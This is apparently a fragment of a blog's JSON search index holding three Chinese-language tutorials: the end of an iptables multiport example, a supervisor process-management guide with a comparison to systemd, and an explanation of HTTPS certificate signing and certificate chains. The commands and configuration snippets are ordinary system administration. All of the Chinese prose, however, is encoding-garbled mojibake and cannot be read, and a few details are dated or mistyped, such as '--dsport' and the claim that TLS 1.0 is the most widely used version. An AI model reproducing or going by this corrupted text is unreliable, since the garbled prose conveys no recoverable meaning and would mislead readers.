ç”¨äºæŒ‡å®šæ‰©å±•æ¨¡å—çš„åç§°ï¼Œæ­£å¥½ï¼Œè¿™ä¸ªæ‰©å±•æ¨¡å—ä¹Ÿå«tcpã€‚\n\n\n\næ‰©å±•åŒ¹é…æ¡ä»¶æ˜¯å¯ä»¥å–åçš„ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨\"!\"è¿›è¡Œå–åï¼Œæ¯”å¦‚ \"! --dport 22\"ï¼Œè¡¨ç¤ºç›®æ ‡ç«¯å£ä¸æ˜¯22çš„æŠ¥æ–‡å°†ä¼šè¢«åŒ¹é…åˆ°ã€‚\n\nä»£è¡¨\"æºç«¯å£\"çš„æ‰©å±•åŒ¹é…æ¡ä»¶ä¸º--sport, ä¸ç®¡æ˜¯--sportè¿˜æ˜¯--dsportï¼Œéƒ½èƒ½å¤ŸæŒ‡å®šä¸€ä¸ªç«¯å£èŒƒå›´ï¼Œæ¯”å¦‚ï¼Œ--dport 22:25è¡¨ç¤ºç›®æ ‡ç«¯å£ä¸º22åˆ°25ä¹‹é—´çš„æ‰€æœ‰ç«¯å£ï¼Œå³22ç«¯å£ã€23ç«¯å£ã€24ç«¯å£ã€25ç«¯å£\n\n\n\n##### 4.5.1 å¤šä¸ªç«¯å£ -m multiport\n\nå¦‚æœæƒ³è¦åŒæ—¶æŒ‡å®šå¤šä¸ªç¦»æ•£çš„ç«¯å£ï¼Œéœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œ\"multiport\"æ¨¡å—ã€‚\n\n```bash\niptables -I INPUT -s 1.1.1.2 -p tcp -m multiport --dports 22,36,80 -j DROP\n\nroot@tencent:~# iptables -nvL INPUT\nChain INPUT (policy ACCEPT 184 packets, 109K bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DROP       tcp  --  *      *       1.1.1.2              0.0.0.0/0            multiport dports 22,36,80\n```\n\n","tags":["iptables"],"categories":["å‘½ä»¤"]},{"title":"supervisorè¿›ç¨‹ç®¡ç†ä½¿ç”¨","url":"%2Fp%2F1825ecdb.html","content":"\nsupervisoræ˜¯ä¸€ä¸ªC/Sç³»ç»Ÿ,å®ƒå¯ä»¥åœ¨ç±»UNIXç³»ç»Ÿä¸Šæ§åˆ¶ç³»ç»Ÿè¿›ç¨‹ï¼Œç”±pythonç¼–å†™ï¼Œæä¾›äº†å¤§é‡çš„åŠŸèƒ½æ¥å®ç°å¯¹è¿›ç¨‹çš„ç®¡ç†ã€‚\n\n<!-- more -->\n\n# 1. supervisor ä»‹ç»\n\nsupervisorä¸»è¦åŒ…å«ä»¥ä¸‹å››ä¸ªéƒ¨åˆ†ï¼š\n\n+ supervisordï¼š\n\n  è¿™ä¸ªæ˜¯supervisoræœåŠ¡çš„ä¸»è¦ç®¡ç†å™¨ï¼Œè´Ÿè´£ç®¡ç†æˆ‘ä»¬é…ç½®çš„å­è¿›ç¨‹ï¼ŒåŒ…æ‹¬é‡å¯å´©æºƒæˆ–å¼‚å¸¸é€€å‡ºçš„å­è¿›ç¨‹ï¼ŒåŒæ—¶ä¹Ÿå“åº”æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚\n\n+ supervisorctlï¼š\n\n  supervisordæœåŠ¡çš„å®¢æˆ·ç«¯å‘½ä»¤è¡Œã€‚å¬è¿‡è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ç”±ä¸»è¿›ç¨‹æ§åˆ¶çš„å­è¿›ç¨‹çš„çŠ¶æ€ï¼Œåœæ­¢å’Œå¯åŠ¨å­è¿›ç¨‹ï¼Œå¹¶è·å¾—ä¸»è¿›ç¨‹çš„è¿è¡Œåˆ—è¡¨ã€‚\n\n+ Web Serverï¼š\n\n  supervisorctlåŠŸèƒ½å¨‰ç¾ã€‚è¿™ä¸ªæ˜¯é€šè¿‡webç•Œé¢æŸ¥çœ‹å’Œæ§åˆ¶è¿›ç¨‹çŠ¶æ€ã€‚\n\n+ XML-RPC Interfaceï¼š\n\n  æœåŠ¡äºweb UIçš„åŒä¸€ä¸ªHTTPæœåŠ¡å™¨æä¾›ä¸€ä¸ªXML-RPCæ¥å£ï¼Œå¯ä»¥ç”¨æ¥è¯¢é—®å’Œæ§åˆ¶ç®¡ç†ç¨‹åºåŠå…¶è¿è¡Œçš„ç¨‹åº\n\n\n\n# 2. supervisorå®‰è£…\n\n```bash\n# å®‰è£…\nsudo pip install supervisor\n\n# å¯åŠ¨æœåŠ¡\nsupervisord -c /etc/supervisord.conf\n\n# æŸ¥çœ‹æ˜¯å¦å¯åŠ¨\nps -ef | grep supervisord\n```\n\n\n\n# 3. supervisoré…ç½®\n\nsupervisor æ˜¯ä¸€ä¸ª C/S æ¨¡å‹çš„ç¨‹åºï¼Œsupervisordæ˜¯ server ç«¯ï¼Œå¯¹åº”çš„ client ç«¯ï¼šsupervisorctl\n\n### 3.1 é»˜è®¤é…ç½®\n\nè¿è¡Œ`echo_supervisord_conf` å‘½ä»¤è¾“å‡ºé»˜è®¤çš„é…ç½®é¡¹, é»˜è®¤ supervisor ä¼šä½¿ç”¨ /etc/supervisord.conf ä½œä¸ºé»˜è®¤é…ç½®æ–‡ä»¶ã€‚\n\næ–‡ä»¶å†…å¯ä»¥çœ‹åˆ°å¦‚ä¸‹é…ç½®, æ‰€ä»¥è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶å¯ä»¥æ”¾åˆ°`/etc/supervisor/conf.d/`æ–‡ä»¶å¤¹ä¸‹.\n\n```ini\n[include]\nfiles = /etc/supervisor/conf.d/*.conf\n```\n\n\n\n### 3.2 åº”ç”¨ç¨‹åºé…ç½®\n\n```ini\n[program:usercenter]  # usercenter æ˜¯åº”ç”¨ç¨‹åºçš„å”¯ä¸€æ ‡è¯†ï¼Œä¸èƒ½é‡å¤ã€‚å¯¹è¯¥ç¨‹åºçš„æ‰€æœ‰æ“ä½œï¼ˆstart, restart ç­‰ï¼‰éƒ½é€šè¿‡åå­—æ¥å®ç°ã€‚\ndirectory = /home/leon/projects/usercenter ; ç¨‹åºçš„å¯åŠ¨ç›®å½•\ncommand = gunicorn -w 8 -b 0.0.0.0:17510 wsgi:app  ; å¯åŠ¨å‘½ä»¤\nautostart = true     ; åœ¨ supervisord å¯åŠ¨çš„æ—¶å€™ä¹Ÿè‡ªåŠ¨å¯åŠ¨\nstartsecs = 5        ; å¯åŠ¨ 5 ç§’åæ²¡æœ‰å¼‚å¸¸é€€å‡ºï¼Œå°±å½“ä½œå·²ç»æ­£å¸¸å¯åŠ¨äº†\nautorestart = true   ; ç¨‹åºå¼‚å¸¸é€€å‡ºåè‡ªåŠ¨é‡å¯\nstartretries = 3     ; å¯åŠ¨å¤±è´¥è‡ªåŠ¨é‡è¯•æ¬¡æ•°ï¼Œé»˜è®¤æ˜¯ 3\nuser = leon          ; ç”¨å“ªä¸ªç”¨æˆ·å¯åŠ¨\nredirect_stderr = true  ; æŠŠ stderr é‡å®šå‘åˆ° stdoutï¼Œé»˜è®¤ false\nstdout_logfile_maxbytes = 20MB  ; stdout æ—¥å¿—æ–‡ä»¶å¤§å°ï¼Œé»˜è®¤ 50MB\nstdout_logfile_backups = 20     ; stdout æ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•°, éœ€è¦æ³¨æ„å½“æŒ‡å®šç›®å½•ä¸å­˜åœ¨æ—¶æ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨åˆ›å»ºç›®å½•\nstdout_logfile = /data/logs/usercenter_stdout.log\n```\n\n\n\n### 3.3 ä½¿ç”¨\n\n+ æ›´æ–°é…ç½®, ä¿®æ”¹é…ç½®åéœ€è¦æ›´æ–°\n\n  ```bash\n  supervisorctl update\n  ```\n  \n+ æŸ¥çœ‹log, ç›´æ¥æŸ¥çœ‹é…ç½®é‡Œçš„log å³å¯\n\n  ```bash\n  stdout_logfile=/home/supervisor_log/uwsgi.log            \n  stderr_logfile=/home/supervisor_log/uwsgi.log\n  ```\n\n\n\n# 4. supervisor å¸¸ç”¨å‘½ä»¤\n\n```bash\nsupervisorctl update #æ›´æ–°æ–°çš„é…ç½®åˆ°supervisordï¼ˆä¸ä¼šé‡å¯åŸæ¥å·²è¿è¡Œçš„ç¨‹åºï¼‰\nsupervisorctl reload #è½½å…¥æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œå¹¶æŒ‰æ–°çš„é…ç½®å¯åŠ¨ã€ç®¡ç†æ‰€æœ‰è¿›ç¨‹ï¼ˆä¼šé‡å¯åŸæ¥å·²è¿è¡Œçš„ç¨‹åºï¼‰\n\nsupervisorctl start xxx #å¯åŠ¨æŸä¸ªè¿›ç¨‹\nsupervisorctl restart xxx #é‡å¯æŸä¸ªè¿›ç¨‹\nsupervisorctl stop xxx #åœæ­¢æŸä¸€ä¸ªè¿›ç¨‹(xxx)ï¼Œxxxä¸º[program:theprogramname]é‡Œé…ç½®çš„å€¼\nsupervisorctl stop groupworker #é‡å¯æ‰€æœ‰å±äºåä¸ºgroupworkerè¿™ä¸ªåˆ†ç»„çš„è¿›ç¨‹(start,restartåŒç†)\nsupervisorctl stop all #åœæ­¢å…¨éƒ¨è¿›ç¨‹ï¼Œæ³¨ï¼šstartã€restartã€stopéƒ½ä¸ä¼šè½½å…¥æœ€æ–°çš„é…ç½®æ–‡\n\nsupervisorctl reread #å½“ä¸€ä¸ªæœåŠ¡ç”±è‡ªåŠ¨å¯åŠ¨ä¿®æ”¹ä¸ºæ‰‹åŠ¨å¯åŠ¨æ—¶æ‰§è¡Œä¸€ä¸‹å°±ok\n```\n\n\n\n# 5. systemdä»‹ç»\n\n> Systemdæ˜¯Linuxä¸­çš„No.1è¿›ç¨‹, å¯ä»¥ç”¨ systemd ç®¡ç† supervisor\n\nLinux æ“ä½œç³»ç»Ÿçš„å¯åŠ¨é¦–å…ˆä» BIOS å¼€å§‹ï¼Œç„¶åç”± Boot Loader è½½å…¥å†…æ ¸ï¼Œå¹¶åˆå§‹åŒ–å†…æ ¸ã€‚å†…æ ¸åˆå§‹åŒ–çš„æœ€åä¸€æ­¥å°±æ˜¯å¯åŠ¨ init è¿›ç¨‹ã€‚è¿™ä¸ªè¿›ç¨‹æ˜¯ç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ŒPID ä¸º 1ï¼Œåˆå«è¶…çº§è¿›ç¨‹ï¼Œä¹Ÿå«æ ¹è¿›ç¨‹ã€‚å®ƒè´Ÿè´£äº§ç”Ÿå…¶ä»–æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ã€‚æ‰€æœ‰çš„è¿›ç¨‹éƒ½ä¼šè¢«æŒ‚åœ¨è¿™ä¸ªè¿›ç¨‹ä¸‹ï¼Œå¦‚æœè¿™ä¸ªè¿›ç¨‹é€€å‡ºäº†ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„è¿›ç¨‹éƒ½è¢« kill ã€‚å¦‚æœä¸€ä¸ªå­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹é€€äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¼šè¢«æŒ‚åˆ° PID 1 ä¸‹é¢ã€‚\n\n2010çš„æœ‰ä¸€å¤©ï¼Œä¸€ä¸ªåœ¨ RedHatå·¥ä½œçš„å·¥ç¨‹å¸ˆ Lennart Poettering å’Œ Kay Sievers ï¼Œå¼€å§‹å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ init ç³»ç»Ÿâ€”â€” systemdã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸éå¸¸æœ‰é‡å¿ƒçš„é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®å‡ ä¹æ”¹å˜äº†æ‰€æœ‰çš„ä¸œè¥¿ï¼Œsystemd ä¸ä½†æƒ³å–ä»£å·²æœ‰çš„ init ç³»ç»Ÿï¼Œè€Œä¸”è¿˜æƒ³å¹²æ›´å¤šçš„ä¸œè¥¿ã€‚\n\n2014 å¹´ï¼ŒDebian Linux å› ä¸ºæƒ³å‡†å¤‡ä½¿ç”¨ systemd æ¥ä½œä¸ºæ ‡å‡†çš„ init å®ˆæŠ¤è¿›ç¨‹æ¥æ›¿æ¢ sysvinit ã€‚è€Œå›´ç»•è¿™ä¸ªäº‹çš„äº‰è®ºè¾¾åˆ°äº†ç©ºå‰çš„çƒ­åº¦ï¼Œäº‰è®ºä¸­å……æ»¡ç€ä»‡æ¨ï¼Œsystemd çš„æ”¯æŒè€…å’Œåå¯¹è€…éƒ½åœ¨äº’ç›¸è¾±éª‚ï¼Œå¯¼è‡´å½“æ—¶ Debian é˜µè¥å¼€å§‹åˆ†è£‚ã€‚\n\nä»Šå¤©ï¼Œsystemd å æ®äº†å‡ ä¹æ‰€æœ‰çš„ä¸»æµçš„ Linux å‘è¡Œç‰ˆçš„é»˜è®¤é…ç½®ï¼ŒåŒ…æ‹¬ï¼šArch Linuxã€CentOSã€CoreOSã€Debianã€Fedoraã€Megeiaã€OpenSUSEã€RHELã€SUSEä¼ä¸šç‰ˆå’Œ Ubuntuã€‚è€Œä¸”ï¼Œå¯¹äº CentOS, CoreOS, Fedora, RHEL, SUSEè¿™äº›å‘è¡Œç‰ˆæ¥è¯´ï¼Œä¸èƒ½æ²¡æœ‰ systemdã€‚\n\n\n\n# 6. supervisorå’Œ systemd å¯¹æ¯”\n\n### 6.1 supervisor\n\n+ ä¼˜ç‚¹\n\n  1 å¯ä»¥é€šè¿‡ç½‘é¡µæ‰§è¡Œå¯åŠ¨åœæ­¢çš„æ“ä½œ\n  2 å•é…ç½®æ–‡ä»¶å¯æ§åˆ¶å¤šä¸ªç¨‹åº\n  3 å¯æ§åˆ¶è¿›ç¨‹æ•°é‡\n  4 è¿›ç¨‹èµ„æºæ§åˆ¶èƒ½åŠ›æ¯”è¾ƒå¼º\n\n+ ç¼ºç‚¹\n\n  1 æœ¬èº«éœ€è¦è¢«ç›‘æ§\n  2 å¼€æœºè‡ªå¯ä¾èµ–å…¶ä»–ç¨‹åº\n  3 ä¸èƒ½è·¨ä¸»æœº\n  4 ä¾èµ–äºmeld3ã€setuptools\n  5 è¿›ç¨‹éœ€åœ¨å‰å°è¿è¡Œ\n\n\n\n### 6.2 systemd\n\n+ ä¼˜ç‚¹\n\n  1å¯ä½¿ç”¨æ¨¡æ¿æ–‡ä»¶\n  2 é™„å¸¦å®šæ—¶å™¨ã€è·¯å¾„ç›‘æ§å™¨ã€æ•°æ®ç›‘æ§å™¨ç­‰åŠŸèƒ½\n  3 æ¯”è¾ƒå¼±çš„è·¨ä¸»æœºèƒ½åŠ›ï¼ŒèŠ‚ç‚¹å¿…é¡»äº’ç›¸æ·»åŠ ssh keyä¿¡ä»»ï¼Œåªèƒ½è¿œç¨‹æ§åˆ¶å·²æœ‰çš„æœåŠ¡\n  4 å¼€æœºå¯ä»¥è‡ªå¯\n  5 å¤§å¤šæ•°å‘è¡Œç‰ˆçš„æ ‡å‡†é…ç½®\n  6 é…å¥—journalctläºŒè¿›åˆ¶ä¿å­˜æ—¥å¿—å¾ˆéš¾ä¼ªé€ ï¼Œæ—¥å¿—æ ¼å¼ç»Ÿä¸€ï¼Œæ—¥å¿—å¤§å°å¯é™åˆ¶\n  7 é™åˆ¶ç‰¹å®šæœåŠ¡å¯ç”¨çš„ç³»ç»Ÿèµ„æºé‡ä¾‹å¦‚CPUã€ç¨‹åºå †æ ˆã€æ–‡ä»¶å¥æŸ„æ•°é‡ã€å­è¿›ç¨‹æ•°é‡\n\n+ ç¼ºç‚¹\n\n  1 å¤šé…ç½®æ–‡ä»¶æ‰èƒ½é…ç½®å¤šä¸ªç¨‹åº\n\n  \n\n# 7. å‚è€ƒèµ„æ–™\n\n+ http://supervisord.org/index.html\n+ https://woni.link/post/12\n+ https://coolshell.cn/articles/17998.html","tags":["supervisor"],"categories":["å‘½ä»¤"]},{"title":"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹","url":"%2Fp%2Fbe73ec63.html","content":"\n\n# 1. https åè®®\n\nHTTPS åè®®ï¼ˆHyperText Transfer Protocol over Secure Socket Layerï¼‰ï¼šå¯ä»¥ç†è§£ä¸ºHTTP+SSL/TLSï¼Œ å³ HTTP ä¸‹åŠ å…¥ SSL å±‚ï¼ŒHTTPS çš„å®‰å…¨åŸºç¡€æ˜¯ SSLï¼Œå› æ­¤åŠ å¯†çš„è¯¦ç»†å†…å®¹å°±éœ€è¦ SSLï¼Œç”¨äºå®‰å…¨çš„ HTTP æ•°æ®ä¼ è¾“ã€‚\n\n<!-- more -->\n\n### 1.1 SSLå†å²å’Œç‰ˆæœ¬\n\n1994å¹´ï¼ŒNetScapeå…¬å¸è®¾è®¡äº†SSLåè®®ï¼ˆSecure Sockets Layerï¼‰çš„1.0ç‰ˆï¼Œä½†æ˜¯æœªå‘å¸ƒã€‚\n\n1995å¹´ï¼ŒNetScapeå…¬å¸å‘å¸ƒSSL 2.0ç‰ˆï¼Œå¾ˆå¿«å‘ç°æœ‰ä¸¥é‡æ¼æ´ã€‚\n\n1996å¹´ï¼ŒSSL 3.0ç‰ˆé—®ä¸–ï¼Œå¾—åˆ°å¤§è§„æ¨¡åº”ç”¨ã€‚\n\n1999å¹´ï¼Œäº’è”ç½‘æ ‡å‡†åŒ–ç»„ç»‡ISOCæ¥æ›¿NetScapeå…¬å¸ï¼Œå‘å¸ƒäº†SSLçš„å‡çº§ç‰ˆTLS 1.0ç‰ˆã€‚\n\n2006å¹´å’Œ2008å¹´ï¼ŒTLSè¿›è¡Œäº†ä¸¤æ¬¡å‡çº§ï¼Œåˆ†åˆ«ä¸ºTLS 1.1ç‰ˆå’ŒTLS 1.2ç‰ˆã€‚æœ€æ–°çš„å˜åŠ¨æ˜¯2011å¹´TLS 1.2çš„ä¿®è®¢ç‰ˆã€‚\n\nç›®å‰ï¼Œåº”ç”¨æœ€å¹¿æ³›çš„æ˜¯TLS 1.0ã€‚ä½†æ˜¯ï¼Œä¸»æµæµè§ˆå™¨éƒ½å·²ç»å®ç°äº†TLS 1.2çš„æ”¯æŒã€‚\n\nTLS 1.0é€šå¸¸è¢«æ ‡ç¤ºä¸ºSSL 3.1,  TLS 1.1ä¸ºSSL 3.2ï¼ŒTLS 1.2ä¸ºSSL 3.3ã€‚\n\n\n\n# 2. æ•°å­—è¯ä¹¦\n\næ•°å­—è¯ä¹¦ï¼Œåˆç§°äº’è”ç½‘ä¸Šçš„\"èº«ä»½è¯\"ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªç»„ç»‡æˆ–ä¸€ä¸ªæœåŠ¡å™¨çš„ï¼Œè¿™å°±å¥½æ¯”æˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ä½¿ç”¨çš„\"å±…æ°‘èº«ä»½è¯\"ï¼Œç”¨äºå”¯ä¸€æ ‡è¯†ä¸€ä¸ªäººã€‚\n\nç½‘ç«™çš„è¯ä¹¦ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ã€‚ä¸€èˆ¬æ¥è¯´æ•°å­—è¯ä¹¦ä»å—ä¿¡çš„æƒå¨è¯ä¹¦æˆæƒæœºæ„ (Certification Authorityï¼Œè¯ä¹¦æˆæƒæœºæ„)ä¹°æ¥çš„ã€‚ä¸€èˆ¬æµè§ˆå™¨åœ¨å‡ºå‚æ—¶å°±å†…ç½®äº†è¯¸å¤šçŸ¥åCAã€‚\n\nå®é™…åº”ç”¨ä¸­ï¼ŒHTTPSå¹¶éç›´æ¥ä¼ è¾“å…¬é’¥ä¿¡æ¯ï¼Œ**è€Œæ˜¯ä½¿ç”¨æºå¸¦å…¬é’¥ä¿¡æ¯çš„æ•°å­—è¯ä¹¦æ¥ä¿è¯å…¬é’¥çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§**ã€‚ç”¨æ¥ä¿éšœHTTPSæœåŠ¡ç«¯å‘é€ç»™å®¢æˆ·ç«¯çš„å…¬é’¥ä¿¡æ¯ä¸è¢«ç¯¡æ”¹ã€‚\n\n\n\n### 2.1 æ•°å­—è¯ä¹¦å†…å®¹\n\nä¸€ä¸ªæ•°å­—è¯ä¹¦é€šå¸¸åŒ…å«äº†ï¼š\n\n- æœåŠ¡å™¨å…¬é’¥ï¼›\n- æŒæœ‰è€…ä¿¡æ¯ï¼›\n- è¯ä¹¦è®¤è¯æœºæ„ï¼ˆCAï¼‰çš„ä¿¡æ¯ï¼›\n- CA å¯¹è¿™ä»½æ–‡ä»¶çš„æ•°å­—ç­¾ååŠä½¿ç”¨çš„ç®—æ³•ï¼›\n- è¯ä¹¦æœ‰æ•ˆæœŸï¼›\n- è¿˜æœ‰ä¸€äº›å…¶ä»–é¢å¤–ä¿¡æ¯ï¼›\n\né‚£æ•°å­—è¯ä¹¦çš„ä½œç”¨ï¼Œæ˜¯ç”¨æ¥è®¤è¯å…¬é’¥æŒæœ‰è€…çš„èº«ä»½ï¼Œä»¥é˜²æ­¢ç¬¬ä¸‰æ–¹è¿›è¡Œå†’å……ã€‚è¯´ç®€å•äº›ï¼Œè¯ä¹¦å°±æ˜¯ç”¨æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œè¯¥æœåŠ¡ç«¯æ˜¯å¦æ˜¯åˆæ³•çš„ï¼Œå› ä¸ºåªæœ‰è¯ä¹¦åˆæ³•ï¼Œæ‰ä»£è¡¨æœåŠ¡ç«¯èº«ä»½æ˜¯å¯ä¿¡çš„ã€‚\n\næˆ‘ä»¬ç”¨è¯ä¹¦æ¥è®¤è¯å…¬é’¥æŒæœ‰è€…çš„èº«ä»½ï¼ˆæœåŠ¡ç«¯çš„èº«ä»½ï¼‰ï¼Œé‚£è¯ä¹¦åˆæ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿåˆè¯¥æ€ä¹ˆè®¤è¯è¯ä¹¦å‘¢ï¼Ÿ\n\nä¸ºäº†è®©æœåŠ¡ç«¯çš„å…¬é’¥è¢«å¤§å®¶ä¿¡ä»»ï¼ŒæœåŠ¡ç«¯çš„è¯ä¹¦éƒ½æ˜¯ç”± CA ï¼ˆCertificate Authorityè¯ä¹¦è®¤è¯æœºæ„ï¼‰ç­¾åçš„ï¼ŒCA å°±æ˜¯ç½‘ç»œä¸–ç•Œé‡Œçš„å…¬å®‰å±€ã€å…¬è¯ä¸­å¿ƒï¼Œå…·æœ‰æé«˜çš„å¯ä¿¡åº¦ï¼Œæ‰€ä»¥ç”±å®ƒæ¥ç»™å„ä¸ªå…¬é’¥ç­¾åï¼Œä¿¡ä»»çš„ä¸€æ–¹ç­¾å‘çš„è¯ä¹¦ï¼Œé‚£å¿…ç„¶è¯ä¹¦ä¹Ÿæ˜¯è¢«ä¿¡ä»»çš„ã€‚\n\nä¹‹æ‰€ä»¥è¦ç­¾åï¼Œæ˜¯å› ä¸ºç­¾åçš„ä½œç”¨å¯ä»¥é¿å…ä¸­é—´äººåœ¨è·å–è¯ä¹¦æ—¶å¯¹è¯ä¹¦å†…å®¹çš„ç¯¡æ”¹ã€‚\n\n\n\n### 2.2 æ•°å­—è¯ä¹¦ç­¾å‘å’ŒéªŒè¯æµç¨‹\n\nå¦‚ä¸‹å›¾å›¾æ‰€ç¤ºï¼Œä¸ºæ•°å­—è¯ä¹¦ç­¾å‘å’ŒéªŒè¯æµç¨‹ï¼š\n\n<img src=\"httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/a.jpg\" alt=\"1\" style=\"zoom:47%;\" />\n\n##### CA ç­¾å‘è¯ä¹¦çš„è¿‡ç¨‹\n\n1. é¦–å…ˆ CA ä¼šæŠŠæŒæœ‰è€…çš„å…¬é’¥ã€ç”¨é€”ã€é¢å‘è€…ã€æœ‰æ•ˆæ—¶é—´ç­‰ä¿¡æ¯æ‰“æˆä¸€ä¸ªåŒ…(è“è‰²)ï¼Œç„¶åå¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œ Hash è®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ª Hash å€¼ï¼›\n\n2. ç„¶å CA ä¼šä½¿ç”¨è‡ªå·±çš„ç§é’¥å°†è¯¥ Hash å€¼åŠ å¯†ï¼Œç”Ÿæˆ Certificate Signatureï¼Œä¹Ÿå°±æ˜¯ CA å¯¹è¯ä¹¦åšäº†ç­¾åï¼›\n\n3. æœ€åå°† Certificate Signature æ·»åŠ åœ¨æ–‡ä»¶è¯ä¹¦ä¸Šï¼Œå½¢æˆæ•°å­—è¯ä¹¦ï¼›ï¼ˆè¯ä¹¦+ç­¾åï¼‰\n\n   \n\n##### å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯çš„æ•°å­—è¯ä¹¦çš„è¿‡ç¨‹\n\n1. é¦–å…ˆå®¢æˆ·ç«¯ä¼šä½¿ç”¨åŒæ ·çš„ Hash ç®—æ³•è®¡ç®—è¯¥è¯ä¹¦çš„ Hash å€¼ H1ï¼›\n\n2. é€šå¸¸æµè§ˆå™¨ä¸­é›†æˆäº† CA çš„å…¬é’¥ä¿¡æ¯ï¼Œæµè§ˆå™¨æ”¶åˆ°æœåŠ¡å™¨çš„è¯ä¹¦åå¯ä»¥ä½¿ç”¨ CA çš„å…¬é’¥è§£å¯† Certificate Signatureï¼ˆç­¾åï¼‰ å†…å®¹ï¼Œå¾—åˆ°ä¸€ä¸ª Hash å€¼ H2 ï¼›\n\n3. æœ€åæ¯”è¾ƒ H1 å’Œ H2ï¼Œå¦‚æœå€¼ç›¸åŒï¼Œåˆ™ä¸ºå¯ä¿¡èµ–çš„è¯ä¹¦ï¼Œå¦åˆ™åˆ™è®¤ä¸ºæœåŠ¡å™¨è¯ä¹¦ä¸å¯ä¿¡ã€‚\n\n### 2.3 è¯ä¹¦é“¾\n\nä½†äº‹å®ä¸Šï¼Œè¯ä¹¦çš„éªŒè¯è¿‡ç¨‹ä¸­è¿˜å­˜åœ¨ä¸€ä¸ªè¯ä¹¦ä¿¡ä»»é“¾çš„é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬å‘ CA ç”³è¯·çš„è¯ä¹¦ä¸€èˆ¬ä¸æ˜¯æ ¹è¯ä¹¦ç­¾å‘çš„ï¼Œè€Œæ˜¯ç”±ä¸­é—´è¯ä¹¦ç­¾å‘çš„ï¼Œæ¯”å¦‚ç™¾åº¦çš„è¯ä¹¦ï¼Œä»ä¸‹å›¾ä½ å¯ä»¥çœ‹åˆ°ï¼Œè¯ä¹¦çš„å±‚çº§æœ‰ä¸‰çº§ï¼š\n\n![1](httpsåè®®åŸç†å’Œè®¤è¯è¿‡ç¨‹/b.jpg)\n\nå¯¹äºè¿™ç§ä¸‰çº§å±‚çº§å…³ç³»çš„è¯ä¹¦çš„éªŒè¯è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- å®¢æˆ·ç«¯æ”¶åˆ° [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) çš„è¯ä¹¦åï¼Œå‘ç°è¿™ä¸ªè¯ä¹¦çš„ç­¾å‘è€…ä¸æ˜¯æ ¹è¯ä¹¦ï¼Œå°±æ— æ³•æ ¹æ®æœ¬åœ°å·²æœ‰çš„æ ¹è¯ä¹¦ä¸­çš„å…¬é’¥å»éªŒè¯ [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) è¯ä¹¦æ˜¯å¦å¯ä¿¡ã€‚äºæ˜¯ï¼Œå®¢æˆ·ç«¯æ ¹æ® [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) è¯ä¹¦ä¸­çš„ç­¾å‘è€…ï¼Œæ‰¾åˆ°è¯¥è¯ä¹¦çš„é¢å‘æœºæ„æ˜¯ â€œGlobalSign Organization Validation CA - SHA256 - G2â€ï¼Œç„¶åå‘ CA è¯·æ±‚è¯¥ä¸­é—´è¯ä¹¦ã€‚\n- è¯·æ±‚åˆ°è¯ä¹¦åå‘ç° â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦æ˜¯ç”± â€œGlobalSign Root CAâ€ ç­¾å‘çš„ï¼Œç”±äº â€œGlobalSign Root CAâ€ æ²¡æœ‰å†ä¸Šçº§ç­¾å‘æœºæ„ï¼Œè¯´æ˜å®ƒæ˜¯æ ¹è¯ä¹¦ï¼Œä¹Ÿå°±æ˜¯è‡ªç­¾è¯ä¹¦ã€‚åº”ç”¨è½¯ä»¶ä¼šæ£€æŸ¥æ­¤è¯ä¹¦æœ‰å¦å·²é¢„è½½äºæ ¹è¯ä¹¦æ¸…å•ä¸Šï¼Œå¦‚æœæœ‰ï¼Œåˆ™å¯ä»¥åˆ©ç”¨æ ¹è¯ä¹¦ä¸­çš„å…¬é’¥å»éªŒè¯ â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦ï¼Œå¦‚æœå‘ç°éªŒè¯é€šè¿‡ï¼Œå°±è®¤ä¸ºè¯¥ä¸­é—´è¯ä¹¦æ˜¯å¯ä¿¡çš„ã€‚\n- â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦è¢«ä¿¡ä»»åï¼Œå¯ä»¥ä½¿ç”¨ â€œGlobalSign Organization Validation CA - SHA256 - G2â€ è¯ä¹¦ä¸­çš„å…¬é’¥å»éªŒè¯ [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) è¯ä¹¦çš„å¯ä¿¡æ€§ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥ä¿¡ä»» [baidu.com](https://link.zhihu.com/?target=http%3A//baidu.com/) 